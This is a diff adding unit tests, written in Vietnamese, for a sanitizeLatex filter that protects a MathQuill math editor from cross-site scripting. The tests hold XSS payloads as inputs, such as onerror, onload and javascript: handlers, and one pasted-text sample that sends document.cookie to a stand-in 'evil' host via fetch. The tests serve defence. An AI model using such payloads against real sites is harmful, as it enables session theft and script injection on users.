@@ -36,6 +36,41 @@ test('loại bỏ mọi lệnh lạ ngoài danh sách cho phép', () => {
   }
 });
 
+test('loại bỏ cả họ lệnh chữ thẳng của MathQuill, không chỉ \\text', () => {
+  // Trong mã nguồn MathQuill 0.10.1, `\textbf`, `\textit`, `\texttt`, `\uppercase`…
+  // đều kế thừa cùng khối text-mode: nội dung `{...}` được nối thẳng vào chuỗi
+  // HTML rồi dựng bằng jQuery, không qua escaping. Test này khoá danh sách
+  // trắng để không ai vô tình thêm họ lệnh này trở lại.
+  for (const attack of [
+    '\\textbf{<img src=x onerror=1>}',
+    '\\textit{<script>alert(1)</script>}',
+    '\\texttt{<svg onload=alert(1)>}',
+    '\\uppercase{<iframe src="//evil">}',
+    '\\emph{<a href="javascript:alert(1)">x</a>}',
+  ]) {
+    const cleaned = sanitizeLatex(attack);
+    ok(!/[<>]/.test(cleaned), `còn ký tự dựng được thẻ HTML trong "${cleaned}"`);
+    ok(!/\\(text|emph|italic|strong|bold|uppercase|lowercase)/i.test(cleaned),
+       `còn lệnh chữ thẳng trong "${cleaned}"`);
+  }
+});
+
+test('loại bỏ lệnh chèn thuộc tính style/class của MathQuill', () => {
+  // `\textcolor{..}{..}` và `\class{..}{..}` ghép đối số thẳng vào thuộc tính
+  // style/class của thẻ span. Ký tự cho phép không có dấu ngoặc kép nên không
+  // thoát ra khỏi thuộc tính được, nhưng vẫn chặn từ đầu cho chắc.
+  const cleaned = sanitizeLatex('\\textcolor{red}{x}\\class{mq-nonleaf}{y}');
+  ok(!/\\(textcolor|class)/.test(cleaned), `lệnh lạ còn sót: ${cleaned}`);
+});
+
+test('văn bản dán qua ô nhập cũng bị lọc như liên kết chia sẻ', () => {
+  // Bộ lọc paste trong mathfield.js dùng lại đúng sanitizeLatex — đầu vào mô
+  // phỏng nội dung clipboard độc hại phải ra cùng kết quả như qua liên kết.
+  const pasted = 'x^2+\\text{<img src=x onerror="fetch(\'//evil?\'+document.cookie)">}';
+  const cleaned = sanitizeLatex(pasted);
+  equal(cleaned, 'x^2+', 'phần toán học hợp lệ được giữ lại');
+});
+
 test('lọc sạch nội dung của lệnh lấy nguyên văn, kể cả khi ngoặc lồng nhau', () => {
   // Chỉ còn chữ và số thì không thể ghép thành thẻ HTML, dù có tình cờ chứa
   // những chữ cái như "onerror" đi nữa.
